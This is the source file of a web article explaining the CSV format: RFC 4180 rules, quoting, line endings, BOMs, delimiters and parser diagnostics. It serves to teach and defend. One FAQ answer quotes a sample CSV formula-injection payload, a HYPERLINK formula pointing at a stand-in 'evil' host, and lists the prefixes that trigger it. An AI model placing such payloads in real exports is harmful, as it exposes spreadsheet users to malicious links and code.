/**
 * CSV: The Complete Format Guide — /learn/csv/
 * Contract: src/lib/content-types.ts (named export `meta`, default export component).
 * Every statement about what ConvertTools detects, sniffs, reports or refuses was
 * executed against src/lib/tools/csv.ts on 2026-11-12; every clause number was read
 * from the published RFC 4180 text on the same date. Behaviour we did not reproduce
 * is hedged or left out. Section ids and labels below match the <Section> blocks in
 * the article body, in document order. No <Figure> in the body: meta.image is the
 * cover PNG only, rendered by ArticleShell under the H1.
 */

import { Callout, CodeBlock, DataTable, H3, KeyTerms, Lead, P, Prose, Rich, Section } from '@/components/content'
import type { ArticleMeta } from '@/lib/content-types'

export const meta: ArticleMeta = {
  slug: 'csv',
  path: '/learn/csv/',
  title: 'CSV Format Guide: RFC 4180, Quoting & Data Loss | ConvertTools',
  description:
    'RFC 4180 clause by clause, plus quoting, line endings, BOMs, delimiter sniffing, untyped columns, spreadsheet data loss, CSV injection and safe writing.',
  h1: 'CSV: The Complete Format Guide',
  summary:
    'The grammar, the quoting rules, the byte-level traps and the exact places where a harmless-looking text file loses your data.',
  keywords: [
    'csv format guide',
    'rfc 4180',
    'csv quoting rules',
    'csv delimiter sniffing',
    'csv bom utf-8',
    'csv injection',
    'csv leading zeros lost',
    'ragged csv rows',
    'csv vs json size',
  ],
  published: '2026-11-02',
  updated: '2026-11-12',
  readingMinutes: 40,
  sections: [
    { id: 'what-csv-is', label: 'What a CSV file actually is' },
    { id: 'rfc-4180-grammar', label: 'RFC 4180 clause by clause' },
    { id: 'quoting-rules', label: 'Quoting rules and spaces' },
    { id: 'line-endings', label: 'CRLF, LF and mixed endings' },
    { id: 'bom-and-charset', label: 'BOMs, code pages and mojibake' },
    { id: 'delimiter-variants', label: 'The delimiter family' },
    { id: 'sniffing', label: 'How sniffing decides' },
    { id: 'header-row', label: 'The header row is a guess' },
    { id: 'ragged-rows', label: 'Ragged rows and blank lines' },
    { id: 'type-free-columns', label: 'Columns without types' },
    { id: 'spreadsheet-damage', label: 'The spreadsheet damage chain' },
    { id: 'csv-injection', label: 'CSV injection' },
    { id: 'writing-csv', label: 'Writing CSV safely' },
    { id: 'two-stage-parse', label: 'The two-stage parse fallacy' },
    { id: 'real-systems', label: 'How real readers behave' },
    { id: 'streaming-and-size', label: 'Big files: streaming and size' },
    { id: 'round-trip-decisions', label: 'Round-trip-safe exports' },
  ],
  faqs: [
    {
      question: 'Is CSV actually a standard?',
      answer:
        'Half of one. RFC 4180 registers the `text/csv` media type and gives a grammar in §2 plus an ABNF in §3, but it describes existing practice rather than dictating it, and it says outright that it is not a strict standard and that implementations vary widely. The parts it does fix are worth quoting in code review: records are separated by CRLF, fields by commas, and a double quote inside a field is written as two double quotes. Everything else you have ever been told about CSV — header rows, encodings, delimiters, trailing newlines — is convention, which is why the same file opens fine in one tool and mangles in another.',
    },
    {
      question: 'Does my CSV file need a UTF-8 BOM?',
      answer:
        'Only if a human will double-click it. A BOM is the character U+FEFF written as the bytes `EF BB BF` at offset 0. RFC 3629 is blunt that its multi-octet function is useless in UTF-8, and that formats with an identified encoding SHOULD forbid it. Spreadsheets are the reason it survives: our converter reports `A UTF-8 byte order mark (EF BB BF) starts the file`, strips it from the body so it never reaches a field value, and notes that Excel uses the mark to detect UTF-8 instead of guessing a legacy code page. For an API or a database load, omit it: any reader that does not special-case offset 0 keeps those three bytes glued to the first column name, and the lookup fails on a key nobody can see.',
    },
    {
      question: 'Why did my ZIP codes lose their leading zeros?',
      answer:
        'Because a CSV cell has no type, and the reader inferred one. `007` is a two-integer string in your export and an integer literal to anything that types columns on ingest, so it becomes `7`, and `01234` becomes `1234`. Our type inference keeps the string when you choose Safe typing — we verified `007` stays the string `"007"` — while the spreadsheet damage auditor flags the pattern `^0\\d{1,}$` as `Leading zero dropped` for exactly the case where the value already went through Excel. Fix it at the producer: quote the field and keep the receiving column typed as text.',
    },
    {
      question: 'Can a CSV field contain a comma or a newline?',
      answer:
        'Yes, and quoting is what makes it legal. RFC 4180 §2 rule 6 says fields containing line breaks (CRLF), double quotes and commas SHOULD be placed in double quotes. So `Li, Wei` is written `"Li, Wei"`, and a two-line address is written as one quoted field holding a real line break inside it. That single rule is why you cannot parse CSV by splitting: a file with 3,000 physical lines can hold 1,200 records. Our parser counts both and reports them separately as row count and cells with newlines, because a mismatch between the two is the fingerprint of a naive split.',
    },
    {
      question: 'Why can’t I just split each line on commas?',
      answer:
        'Because commas, line breaks and quotes all appear inside quoted fields, so the two operations you need are not independent. We ran the numbers on a 33-byte file: naive line splitting produced 5 pieces where there are 3 logical records, and per-line comma splits reported field counts of `[2, 2, 1, 2, 1]` for a table that has exactly 2 columns. A regex for "quoted or unquoted" does not rescue you either — on `1,"a""b",3` it returned `["1", "\"a\"", "\"b\"", "3"]`, shredding the escaped quote. Only a state machine that tracks whether it is inside a quoted field gets this right.',
    },
    {
      question: 'What is the maximum size of a CSV file?',
      answer:
        'The format imposes none: RFC 4180 places no limit on the number of records or the length of a field, and the ABNF allows an unbounded number of fields per record. Practical limits come from whoever reads it. Microsoft publishes 1,048,576 rows and 16,384 columns as the worksheet ceiling, and 32,767 characters as the per-cell limit, so a 2-million-row export is valid CSV and unopenable in Excel. Our auditor checks both file-level ceilings and flags rows and columns above them before you lose an afternoon to a truncated import.',
    },
    {
      question: 'What is CSV injection and how do I stop it?',
      answer:
        'It is code execution by inference: a cell whose text begins with `=`, `+`, `-`, `@`, a tab or a carriage return is treated as a formula by spreadsheet software, so `=HYPERLINK("http://evil","Click")` in an exported report runs when a reviewer opens it. OWASP documents this as DFXP and lists the same prefixes. Our writer quotes any field longer than one character that starts with `=`, `+`, `-` or `@`, which neutralises the naive reader, and the auditor labels such cells `Formula injection (DFXP)`. The complete mitigation is a prefix quote character plus keeping formula evaluation off for imported data.',
    },
    {
      question: 'Should I use CSV or JSON for an export?',
      answer:
        'Use CSV when every record is a row of the same flat table and size matters; use JSON when you need nesting, types or key stability. On a 100,000-record, six-column table we measured 6,634,992 bytes of LF-separated CSV against 12,534,960 bytes of minified JSON and 16,734,961 bytes indented by two spaces — CSV is 0.529 of the compact JSON size, because JSON repeats every key in every object. The trade is everything CSV cannot express: a nested object flattened into columns comes back with dotted paths, not structure, and every value arrives as a string. Our [JSON to CSV converter](/format-converters/json-to-csv/) shows you the flattening it is about to do before you commit to it.',
    },
  ],
  sources: [
    {
      label: 'RFC 4180 — Common Format and MIME Type for CSV Files',
      href: 'https://datatracker.ietf.org/doc/html/rfc4180',
      detail:
        'The §2 grammar rules 1–7 quoted throughout, the verbatim sentence “Spaces are considered part of a field and should not be ignored”, the §3 ABNF productions and the text/csv registration with optional charset and header parameters.',
      accessed: '2026-11-12',
    },
    {
      label: 'RFC 4180 (plain text mirror)',
      href: 'https://www.rfc-editor.org/rfc/rfc4180.txt',
      detail:
        'Cross-checked for the exact wording of §2 rules 2 (the last record’s line break is optional), 3 (the header line must be agreed upon), 5 (unquoted fields must not contain double quotes) and §4’s “not a strict standard” and “implementations vary widely” statements.',
      accessed: '2026-11-12',
    },
    {
      label: 'IANA — Media Type Registration: text/csv',
      href: 'https://www.iana.org/assignments/media-types/text/csv',
      detail:
        'Confirms RFC 4180 is the registering publication, that no required parameters exist, that the optional parameters are charset and header with values present or absent, and that encoding considerations are given as CRLF.',
      accessed: '2026-11-12',
    },
    {
      label: 'RFC 3629 — UTF-8, a transformation format of ISO 10646',
      href: 'https://www.rfc-editor.org/rfc/rfc3629.txt',
      detail:
        'Source for U+FEFF as the BYTE ORDER MARK, the EF BB BF octet sequence in UTF-8, the statement that the multi-octet function is useless in UTF-8, the MAY for an initial U+FEFF to be a signature or a zero-width no-break space, and the SHOULD that protocols and formats with an identified encoding forbid a BOM.',
      accessed: '2026-11-12',
    },
    {
      label: 'OWASP — CSV Injection',
      href: 'https://community.owasp.org/attacks/CSV_Injection',
      detail:
        'The dangerous prefix set (=, +, -, @, tab, carriage return, line feed and full-width variants), the spreadsheet applications affected, and the mitigations of quoting fields, prefixing an apostrophe, escaping double quotes and prefixing a tab — including the warning that Excel may strip quotes and reactivate previously escaped formulas.',
      accessed: '2026-11-12',
    },
    {
      label: 'Microsoft — Excel specifications and limits',
      href: 'https://support.microsoft.com/en-us/office/excel-specifications-and-limits-1672b34d-7043-467e-8e27-269d656771c3',
      detail:
        'Worksheet size of 1,048,576 rows by 16,384 columns, 32,767 characters in a cell, 15 digits of number precision and an 8,192-character formula limit — the ceilings our spreadsheet auditor compares your row and column counts against.',
      accessed: '2026-11-12',
    },
    {
      label: 'PostgreSQL documentation — COPY',
      href: 'https://www.postgresql.org/docs/current/sql-copy.html',
      detail:
        'The CSV mode quoting sentence, the rule that a NULL is written as the NULL parameter string unquoted while a non-NULL value matching it is quoted, FORCE_QUOTE, FORCE_NOT_NULL, the default tab and comma delimiters, ESCAPE defaulting to QUOTE, and the “not strictly one line per table row” note.',
      accessed: '2026-11-12',
    },
    {
      label: 'Python 3 documentation — csv reader and writer objects',
      href: 'https://docs.python.org/3/library/csv.html',
      detail:
        'The excel, excel_tab and unix dialects, the CRLF lineterminator default, the reader being hard-coded to recognise either a carriage return or a line feed and to ignore lineterminator, the newline="" file-open requirement, doublequote and escapechar defaults, and the QUOTE_MINIMAL, QUOTE_ALL, QUOTE_NONNUMERIC and QUOTE_NONE writer modes.',
      accessed: '2026-11-12',
    },
    {
      label: 'Papa Parse documentation',
      href: 'https://www.papaparse.com/docs',
      detail:
        'Browser-side reference for delimiter guessing from delimitersToGuess, quoteChar/escapeChar/newline options, skipEmptyLines, dynamicTyping converting numbers and booleans while ignoring dates, and the step/chunk/worker streaming options for large files.',
      accessed: '2026-11-12',
    },
  ],
  related: [
    { path: '/format-converters/csv-to-json/', name: 'CSV to JSON Converter', blurb: 'Sniffs the delimiter, types each column and reports BOMs, ragged rows and spreadsheet risk in the browser.' },
    { path: '/format-converters/json-to-csv/', name: 'JSON to CSV Converter', blurb: 'Flattens nested JSON into columns and warns where records disagree about the key set.' },
    { path: '/learn/json/', name: 'JSON: The Complete Specification Guide', blurb: 'The target format for every CSV import, with the number grammar that decides what a digit string means.' },
    { path: '/compare/csv-vs-excel/', name: 'CSV vs Excel', blurb: 'Where the text format and the spreadsheet disagree, and which one moves.' },
    { path: '/compare/csv-vs-tsv/', name: 'CSV vs TSV', blurb: 'Tab-separated files, and the cases where the delimiter choice removes a whole class of bug.' },
    { path: '/use-cases/data-migration/', name: 'Migrating data between formats', blurb: 'An ordered workflow for moving a table without silently changing a single value.' },
  ],
  words: 7960,
  image: '/images/covers/learn-csv.png',
  imageAlt: 'A CSV file rendered as three quoted rows with the commas that separate fields highlighted and the commas inside quotes dimmed.',
}

export default function Article() {
  return (
    <Prose>
      <Lead>
        CSV is a text file in which rows of a table are written one per line and the columns of each row are separated by a
        character that is not part of the data. That sentence covers 95% of real CSV files, and the remaining 5% is where the
        bugs live: quoted fields containing the separator, commas that are data rather than structure, a three-byte mark at
        offset 0 that changes which characters the rest of the file means, and readers that quietly rewrite values they cannot
        represent. This guide walks the grammar rule by rule, then follows a value through the systems that damage it.
      </Lead>

      <Section id="what-csv-is" title="What a CSV file actually is" kicker="Definitions">
        <P>
          A CSV file is a serialisation of a rectangular table into characters. There is exactly one specification for the
          common case — RFC 4180, an October 2006 informational memo that documents existing practice and registers the{' '}
          <Rich text="`text/csv`" /> media type with IANA — and an enormous body of unspecced practice around it. The RFC is
          unusually honest about this: it states that it is not a strict standard, and that implementations vary widely. Every
          confusing bug you have had with a CSV file is a consequence of those two clauses.
        </P>
        <P>
          What the format is, precisely: a stream of characters, divided into records by a line break, each record divided into
          fields by a comma, with double quotes as an escape hatch for fields that contain any of those three things. What it is
          not: a container, a schema, an encoding declaration, or a typed data model. There is no header block, no length
          prefix, no magic number — IANA’s registration for the media type records the magic-number field as none, which is why
          you cannot identify a CSV file by looking at its first bytes, and why{' '}
          <Rich text="`.csv`" /> files are so often actually tab-separated, semicolon-separated or UTF-16.
        </P>
        <P>
          Compare that with JSON, which specifies a grammar, a data model, a mandatory UTF-8 encoding and an escaping scheme in
          one document (see <Rich text="[the JSON guide](/learn/json/)" />). CSV specifies a layout and nothing else. The
          practical consequence is that a CSV file is always interpreted by a <em>reader</em>, and two readers can disagree
          without either being wrong. When our <Rich text="[CSV to JSON converter](/format-converters/csv-to-json/)" /> parses a
          file, it prints the decisions it made — which delimiter it chose and why, whether the first row was a header, what it
          did with the BOM, what type it inferred for each column — because those are precisely the things the format leaves
          open.
        </P>
        <H3>The vocabulary this guide uses</H3>
        <KeyTerms
          items={[
            { term: 'record', definition: 'One row of the table. RFC 4180 §2 speaks of records, not rows; a record can span several physical lines.' },
            { term: 'field', definition: 'One cell. Also “column value”. A field may be empty, quoted, or contain the delimiter.' },
            { term: 'delimiter', definition: 'The single character separating fields within a record. Comma by default, tab, semicolon and pipe in the wild.' },
            { term: 'terminator', definition: 'The line break ending a record: CRLF per the RFC, LF or CR per whoever wrote the file.' },
            { term: 'quoted field', definition: 'A field wrapped in double quotes so its contents stop being structural. Escaped quotes appear as two characters.' },
            { term: 'BOM', definition: 'The Unicode character U+FEFF at offset 0, written EF BB BF in UTF-8. Signals an encoding, and pollutes the first field name.' },
            { term: 'header row', definition: 'An optional first record whose fields name the columns. RFC 4180 calls it an “header line” and requires agreement.' },
            { term: 'ragged row', definition: 'A record whose field count differs from the header’s. The most common structural defect in real files.' },
            { term: 'dialect', definition: 'The tuple of delimiter, quote character, escape character and line terminator a reader assumes.' },
            { term: 'round trip', definition: 'Parse then re-serialise and get the same values back. The only real test that a CSV pipeline is lossless.' },
          ]}
        />
      </Section>

      <Section id="rfc-4180-grammar" title="RFC 4180 clause by clause" kicker="The specification">
        <P>
          §2 of RFC 4180 contains seven numbered rules. Reading them literally is worth four minutes, because each one
          corresponds to a class of production incident.
        </P>
        <P>
          <strong>Rule 1</strong> — each record is located on a separate line, delimited by a line break, and the break named is
          CRLF. <strong>Rule 2</strong> — the last record in the file may or may not have an ending line break; both forms are
          conformant, which alone means a trailing newline is a convention you cannot test another producer against.{' '}
          <strong>Rule 3</strong> — there MAY be an optional header line appearing first, any format compatible with the records
          must be acceptable for that line, and the presence or absence of the header has to be agreed upon between the producing
          and consuming systems. That sentence is the entire legal basis for the header row, and it is a handshake, not a property
          of the file.
        </P>
        <P>
          <strong>Rule 4</strong> — fields are separated by a comma, spaces are considered part of a field and should not be
          ignored, the last field in a record must not be followed by a comma, and there may be an unlimited number of fields per
          record. <strong>Rule 5</strong> — each field may or may not be enclosed in double quotes, and a field that is not
          enclosed must not contain a double quote. <strong>Rule 6</strong> — fields containing line breaks, double quotes and
          commas should be enclosed in double quotes. <strong>Rule 7</strong> — a double quote appearing inside a quoted field is
          escaped by preceding it with another double quote.
        </P>
        <P>
          Notice what rule 4 does and does not say. It fixes the comma, it makes spaces significant, and it forbids a trailing
          comma — but the expectation that every record carries the same number of fields is expressed only through rule 3’s
          “compatible with the records” wording, never as a standalone cardinality rule. That silence is why a ragged row is such a
          persistent defect: exporters routinely produce one by computing the column list from the first record instead of the
          union of all records, and no clause tells them that is wrong in as many words.
        </P>
        <P>
          One piece of verbatim wording matters more than the summary suggests, because it is quoted inside a §2 rule rather than
          in a discussion: <em>“Spaces are considered part of a field and should not be ignored.”</em> That is the authority
          against the reflex to trim. A file written as{' '}
          <Rich text="`id, name`" /> has a second column literally named{' '}
          <Rich text="` name`" /> — leading space included — and a consumer that trims is now deviating from the text it claims to
          implement, while a consumer that does not trim has a key that matches nothing in its schema. Both behaviours are
          defensible; only one of them is silent.
        </P>
        <CodeBlock
          title="RFC 4180 §3 ABNF, productions as written"
          language="abnf"
          code={`CSV-file    = [header CRLF] record *(CRLF record) [CRLF]
header      = name *(COMMA name)
record      = field *(COMMA field)
name        = field
field       = (escaped / non-escaped)
escaped     = DQUOTE *(TEXTDATA / COMMA / CR / LF / 2DQUOTE) DQUOTE
non-escaped = *TEXTDATA
COMMA       = %x2C
CR          = %x0D
DQUOTE      = %x22
LF          = %x0A`}
          caption="The productions are the memo’s; the character ranges for TEXTDATA, SP and HTAB are left out because they are a terminal list rather than the point. What matters here is what the grammar does not contain: no encoding declaration, no escape character other than the doubled quote, no limit on field count or field length, and no comment syntax. Anything you have seen that looks like any of those is a reader extension."
        />
        <P>
          Two things fall out of the ABNF that surprise people. First,{' '}
          <Rich text="`file`" /> permits an optional trailing{' '}
          <Rich text="`CRLF`" /> and nothing else: a file ending in two line breaks has an extra empty record by this grammar,
          which is why blank lines are a diagnostic and not whitespace. Second, the{' '}
          <Rich text="`escaped`" /> production allows{' '}
          <Rich text="`CR`" /> and{' '}
          <Rich text="`LF`" /> individually inside quotes, which is the clause that lets a postal address or a multi-line
          comment survive a round trip — and the clause that breaks every{' '}
          <Rich text={"`split('\\n')`"} /> in existence.
        </P>
        <H3>What §3 registers as text/csv</H3>
        <P>
          The registration defines the type name, the subtype, and two optional parameters.{' '}
          <Rich text="`charset`" /> takes a value from the IANA character-set registry — for example{' '}
          <Rich text="`UTF-8`" /> — and exists so that{' '}
          <Rich text="`text/csv; charset=windows-1252`" /> can be sent over HTTP; without it, the default per RFC 2046 is{' '}
          <Rich text="`us-ascii`" />, which is why a bare{' '}
          <Rich text="`Content-Type: text/csv`" /> header with accented names in the body is a bug you can see from the client.{' '}
          <Rich text="`header`" /> takes ‘present’ or ‘absent’ (the RFC’s wording, verbatim) and is the machine-readable answer to
          the question RFC 4180 says must be agreed upon between producer and consumer. IANA’s registry records the required
          parameters as none, the encoding considerations as CRLF, the magic number as none, and the file extension as{' '}
          <Rich text="`.csv`" />.
        </P>
        <Callout tone="spec" title="Use the parameters, or lose the argument">
          <P>
            If you control both ends of a CSV transfer, the header{' '}
            <Rich text="`charset`" /> is the cheapest fix available for the entire encoding class of bugs, and{' '}
            <Rich text="`header=present`" /> removes the single most common parse disagreement. Neither costs a byte in the file
            body, because they live in the metadata.
          </P>
        </Callout>
      </Section>

      <Section id="quoting-rules" title="Quoting: the only escape mechanism CSV has" kicker="Field syntax">
        <P>
          Double quotes are not decoration and they are not optional styling. They are the entire escape system of the format, and
          they do exactly three things: let a field contain the delimiter, let it contain a line break, and let it contain a double
          quote. Rule 5 forbids an unquoted field from containing a quote character at all; rule 6 requires quoting as soon as a
          field contains a comma, a line break or a quote; rule 7 gives the only representation of a literal quote, which is two of
          them in a row. There is no backslash escape in RFC 4180, no percent encoding, no entity references.
        </P>
        <P>
          The byte cost is mechanical. The value{' '}
          <Rich text="`He said &quot;hi&quot;, loudly`" /> is 20 bytes of text; the same value written as a CSV field is{' '}
          <Rich text="`&quot;He said &quot;&quot;hi&quot;&quot;, loudly&quot;`" />, 24 bytes: two for the wrapping quotes, two more for
          the doubled pair around{' '}
          <Rich text="`hi`" />. Every quote in your data costs two bytes and every delimiter inside a quoted field costs nothing —
          that asymmetry is why a quote-heavy column can double in size while an address column barely grows.
        </P>
        <P>
          The clause that breaks parsers is embedded newlines. Here is a three-record file in which one bio field spans two lines;
          it is 33 bytes as written, 37 bytes with CRLF terminators:
        </P>
        <CodeBlock
          title={'a quoted field containing a line break (33 bytes)'}
          language="csv"
          code={`id,bio
1,"line one
line two"
2,y`}
          caption="Five physical lines. Three records. Our parser reports rowCount 3, quotedCells 1 and embeddedNewlines 1 for exactly this input, and its sniffing note for it reads “comma (,) scored highest (1 occurrences, 75% row consistency) but the counts vary, so set the delimiter explicitly.”"
        />
        <P>
          Splitting that file on{' '}
          <Rich text={"`\\n`"} /> and then on commas produces five chunks with field counts{' '}
          <Rich text="`[2, 2, 1, 2, 1]`" /> — a table with a one-column row and a two-column row, neither of which exists. The
          state machine in <Rich text="[the two-stage fallacy section](#two-stage-parse)" /> returns the two-column table above.
          Same input, same code path, and the only difference is whether the parser was allowed to remember that it stood inside a
          quoted field.
        </P>
        <H3>What a malformed quote does to a value</H3>
        <P>
          Real files get this wrong constantly, and readers differ in how loudly. Feeding the parser three malformed shapes gives
          three different outcomes, all of them verified against{' '}
          <Rich text="`src/lib/tools/csv.ts`" />:
        </P>
        <DataTable
          caption="Three malformed quoting shapes and what our parser produces for each"
          head={['Input line', 'Fields produced', 'Diagnostic']}
          rows={[
            ['1,abc"def', '["1", "abc\\"def"] — value kept verbatim', 'warning text-after-closing-quote: the quote is not at the start of the field'],
            ['1,abc",x', '["1", "abc\\"", "x"]', 'warning quote-not-at-start (§2 rule 6) plus error ragged-row'],
            ['"a"b,2', '["ab", "2"]', 'no diagnostic — the stray b silently joins the quoted value'],
          ]}
          foot="The third row is the dangerous one: RFC 4180 says nothing about text between a closing quote and the next delimiter, so it is a reader extension, and ours is to keep the characters and raise nothing."
        />
        <P>
          An unterminated quote is worse, because it is not local to one row.{' '}
          <Rich text={"`1,\\\"unterminated`"} /> followed by more lines makes the parser swallow every following line into one field
          until the file ends; our parser stops and reports{' '}
          <Rich text="`A quoted field opened on line 3 is never closed.`" /> as an error rather than returning a single record with
          a giant cell. Truncation of the rest of the file is the alternative behaviour, and neither is acceptable silently — which
          is why the parse report prints the number of records it accepted next to the number of lines it read.
        </P>
        <H3>Spaces are data, not formatting</H3>
        <P>
          Rule 4’s sentence — “Spaces are considered part of a field and should not be ignored” — means{' '}
          <Rich text="`id, name`" /> has a header cell literally equal to{' '}
          <Rich text="` name`" />. Python’s csv module agrees: its{' '}
          <Rich text="`skipinitialspace`" /> option exists precisely because the default is False, and default False means the
          space stays in the value. The same file read with trimming enabled yields headers{' '}
          <Rich text={"`[\\\"id\\\", \\\"name\\\"]`"} /> and a value{' '}
          <Rich text="`Anne`" /> instead of{' '}
          <Rich text="` Anne`" />; read without it, the key your code looks up does not exist.
        </P>
        <Callout tone="warn" title="Trimming is a decision with a victim">
          <P>
            Trim the leading space off a name column and you have also trimmed the significant padding off a fixed-width code, an
            indentation-sensitive free-text field, and any value where a trailing space distinguishes two records. Our converter
            exposes this as an explicit checkbox rather than doing it for you, because the RFC’s position is that the spaces are
            yours to keep unless you decide otherwise.
          </P>
        </Callout>
      </Section>

      <Section id="line-endings" title="CRLF, LF, CR and the mixed-ending file" kicker="Record syntax">
        <P>
          RFC 4180 names one terminator: the two-byte CR LF sequence, decimal 13 then 10. It also concedes, in the very same rule,
          that the last record may or may not have a trailing break. Everything else in the wild — a bare LF from a Unix tool, a
          bare CR from very old Mac software, or a file that contains more than one style because somebody appended to it with a
          different editor — is outside what the grammar will accept.
        </P>
        <P>
          The cost is one byte per record, and on a big export that is measurable.{' '}
          <Rich text={"`a,b,c\\r\\n`"} /> is 7 bytes where{' '}
          <Rich text={"`a,b,c\\n`"} /> is 6. On the 100,000-record, six-column table measured later in this guide, the LF version came
          to 6,634,992 bytes and the CRLF version to 6,734,993 — a difference of 100,001 bytes, about 1.5%. That is a rounding error on the wire and a real one on
          cold storage, but it is never the reason to choose one: interoperability is.
        </P>
        <P>
          The interesting part is what readers do about it. Python’s documentation is unusually explicit, and its two statements
          look contradictory until you notice they address different halves of the library: the writer’s{' '}
          <Rich text="`lineterminator`" /> defaults to CRLF, while the reader is documented as hard-coded to recognise either a
          carriage return or a line feed and to ignore{' '}
          <Rich text="`lineterminator`" /> entirely. Python also requires that you open the file with{' '}
          <Rich text={"`newline=\\\"\\\"`"} />, because the alternative is that universal-newline translation rewrites the line breaks
          inside quoted fields — the docs’ own footnote says embedded newlines get misread and an extra carriage return appears on
          platforms that use CRLF.
        </P>
        <P>
          PostgreSQL’s COPY takes the opposite tack and documents it plainly: CSV mode will both recognise and produce files whose
          quoted values contain embedded carriage returns and line feeds, so, in its words, the files are not strictly one line per
          table row. That is the correct reading of rule 6, and it is the behaviour you must assume from any tool that claims to
          write database CSV exports.
        </P>
        <H3>How our parser classifies a file</H3>
        <P>
          Before splitting anything,{' '}
          <Rich text="`parseCsv`" /> scans the whole body and classifies the terminators as{' '}
          <Rich text="`CRLF`" />,{' '}
          <Rich text="`LF`" />,{' '}
          <Rich text="`CR`" />,{' '}
          <Rich text="`mixed`" /> or{' '}
          <Rich text="`none`" />, and reports the label in the parse banner. A single-style file is silent. A file containing both
          styles gets a warning naming each style it found — for a body holding CRLF and LF records the message reads{' '}
          <Rich text="`The file mixes CRLF LF line endings.`" /> — and the hint cites RFC 4180 §2’s statement that lines SHOULD end
          with CRLF. A file whose only terminator is a bare carriage return is warned about separately, because that is the shape
          most line-oriented tools read as one enormous record.
        </P>
        <DataTable
          caption="Terminator styles, their byte cost and what the readers above do with them"
          head={['Terminator', 'Bytes/record', 'RFC 4180 conformant?', 'Notable reader behaviour']}
          rows={[
            ['CRLF', 2, 'Yes — the only one named', 'Python writer default; Postgres CSV mode both reads and writes it'],
            ['LF', 1, 'No, though universally accepted', 'Python reader accepts it; our parser reports it as the file’s ending style'],
            ['CR alone', 1, 'No', 'Our parser warns; line-oriented splitters see one giant record'],
            ['Mixed', '1–2', 'No', 'Our parser warns and names the styles found; diff tools report whole-file changes'],
            ['None (no final break)', 0, 'Yes, explicitly optional', 'Nothing to detect; the last record still parses'],
          ]}
        />
        <Callout tone="warn" title="Mixed endings are a whole-file diff, a broken sniffer and a duplicate key">
          <P>
            Three consequences follow from one file. Version control shows every line changed after a normalisation pass, so a
            reviewer cannot see the edit that mattered. Delimiter sniffing that samples by line can lose consistency because the
            splitter that counts commas and the classifier that counts endings disagree about where lines are. And a loader that
            strips only{' '}
            <Rich text={"`\\n`"} /> leaves a trailing{' '}
            <Rich text={"`\\r`"} /> glued to the last column of every record, which is how a perfectly good country code turns into
            two values that differ by one invisible character.
          </P>
        </Callout>
      </Section>

      <Section id="bom-and-charset" title="Byte order marks, code pages and mojibake" kicker="Encoding">
        <P>
          A BOM is one character with two jobs and no business being in a UTF-8 file. RFC 3629 defines it: U+FEFF used at the start
          of a stream is the BYTE ORDER MARK, and in UTF-8 it is written as the three octets{' '}
          <Rich text="`EF BB BF`" />. The same memo says the multi-octet function it serves is useless in UTF-8, that an initial
          U+FEFF MAY be interpreted either as a signature or as a zero-width no-break space, that protocols and formats which
          mandate or identify their encoding SHOULD forbid it, and that implementations which do encounter one SHOULD strip or
          ignore it. RFC 4180 mandates no encoding at all, which is exactly why the question never resolves itself.
        </P>
        <P>
          The arithmetic is easy to state precisely. The five-character line{' '}
          <Rich text={"`id,name\\r\\n`"} /> is 9 bytes; the same line with a UTF-8 BOM in front is 12 bytes, and the file’s text is
          10 characters long while being 12 bytes wide. Those three bytes are not invisible to a parser that has not been told
          about them: they arrive attached to the first header cell, so the column is named{' '}
          <Rich text={"`\\ufeffid`"} /> rather than{' '}
          <Rich text="`id`" />, and the lookup{' '}
          <Rich text={"`row[\\\"id\\\"]`"} /> returns nothing while{' '}
          <Rich text="`Object.keys(row)`" /> prints something that looks identical on a terminal.
        </P>
        <P>
          Our parser therefore does the strip and says so. Detection is a check of{' '}
          <Rich text="`charCodeAt(0) === 0xFEFF`" /> on the received text; the report is an informational diagnostic reading{' '}
          <Rich text="`A UTF-8 byte order mark (EF BB BF) starts the file.`" />, the hint explains that spreadsheet software uses
          the mark to detect UTF-8 instead of guessing a legacy code page, and the mark is removed from the body before the first
          field name is cut. On the writing side, the <Rich text="[JSON to CSV converter](/format-converters/json-to-csv/)" /> has
          an explicit BOM switch labelled as the thing that stops Excel guessing the code page — because that is the only reason to
          emit one.
        </P>
        <H3>Why the bytes are not the characters</H3>
        <P>
          A CSV file declares no encoding, so the reader picks one, and if the pick is wrong every non-ASCII character in the file
          is reinterpreted. There are three families of failure and they look nothing alike. Decode UTF-8 text as a single-byte code
          page and each accented letter becomes a digraph — the two bytes of one character surface as two characters, which is the
          garble people usually call mojibake. Decode a single-byte file as UTF-8 and the sequence is simply invalid, so you get a
          replacement character where a name used to be. Decode a legacy double-byte encoding with the wrong table and the damage is
          structural rather than cosmetic: some multi-byte encodings permit trail bytes in the range that also contains the ASCII
          comma, so a delimiter-looking byte can sit inside a single character and split a field that was never split.
        </P>
        <P>
          This is why guessing is the wrong tool. If you control the channel, set the{' '}
          <Rich text="`charset`" /> parameter on the media type, or agree an encoding out of band, and write UTF-8 without a BOM for
          machines and with one for double-clickers. Our parser deliberately does not attempt code-page detection — it receives text
          that has already been decoded and only recognises the UTF-8 mark at offset 0 — so if a file arrives in a legacy encoding,
          the conversion has to happen before the CSV step, not during it. Binary payloads that have to survive a text channel are a
          different problem with a different tool: see the{' '}
          <Rich text="[Base64 guide](/learn/base64/)" />.
        </P>
        <Callout tone="spec" title="The honest position on BOMs">
          <P>
            Emit one when a human will open the file in spreadsheet software, and never when a program will read it. RFC 3629’s
            SHOULD-forbid applies to formats that identify their encoding; CSV is not one of them, so the decision falls to you,
            and the decision should be written down next to the export. RFC 3629 also carries a security note about invalid
            sequences that decode to a BOM through other transformations, which is a second reason not to treat the mark as mere
            whitespace.
          </P>
        </Callout>
      </Section>

      <Section id="delimiter-variants" title="The delimiter family: semicolon, tab, pipe, caret" kicker="Dialects">
        <P>
          The comma is a default, not a law. Every serious CSV producer lets you choose the separating character, and a large
          fraction of the world’s CSV files are not comma-separated at all. The reasons are specific and worth knowing, because they
          tell you which delimiter to expect from which source.
        </P>
        <P>
          <strong>Semicolon</strong> output typically comes from spreadsheet software configured for a locale whose decimal
          separator is a comma: a file whose numbers contain{' '}
          <Rich text="`7,25`" /> cannot also use{' '}
          <Rich text="`,`" /> as its field separator, so the list separator moves. If your export has prices with comma decimals and
          your loader splits on commas, the field count per row becomes a function of how many fractional amounts appear, which is
          the most confusing possible way to be wrong. <strong>Tab</strong>-separated files are the default in another big piece of
          software and in a database’s text-mode export: PostgreSQL’s COPY uses a tab as the default delimiter in text format and a
          comma in CSV format, and Python ships an{' '}
          <Rich text="`excel_tab`" /> dialect for exactly this file. TSV’s virtue is that a literal tab almost never occurs inside
